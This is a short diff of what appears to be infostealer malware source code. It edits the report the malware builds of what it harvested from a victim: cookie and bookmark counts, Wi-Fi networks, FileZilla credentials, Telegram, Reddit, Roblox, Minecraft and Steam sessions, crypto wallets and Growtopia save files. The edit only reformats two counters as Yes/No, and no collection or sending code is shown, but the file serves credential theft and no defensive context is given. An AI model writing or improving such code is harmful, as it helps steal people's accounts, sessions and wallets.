@@ -3491,7 +3491,7 @@
                 "🍪 Cookies": client.config.counter.cookies,
                 "🔖 Bookmarks": client.config.counter.bookmarks,
                 "📶 Wifi networks": client.config.counter.wifinetworks,
-                "🐱‍💻 Found FileZilla?": client.config.counter.filezilla,
+                "🐱‍💻 Found FileZilla?": client.config.counter.filezilla ? "Yes" : "No",
                 "📱 Found Telegram session(s)?": client.config.counter.telegram ? "Yes" : "No",
                 "🌐 Found Wallet(s)": client.config.counter.wallets,
                 "🤖 Found Reddit session(s)": client.config.counter.reddit_found,
@@ -3501,7 +3501,7 @@
                 "🤖 Found Roblox session(s)": client.config.counter.roblox_found,
                 "🧱 Found Minecraft session(s)": client.config.counter.minecraft_found,
                 "😤 Found Steam session(s)": client.config.counter.steam_found,
-                "🧒 Found Growtopia save.dat?": client.config.counter.growtopia,
+                "🧒 Found Growtopia save.dat?": client.config.counter.growtopia ? "Yes" : "No",
               })) {
                 obj["fields"].push({
                   name: key,
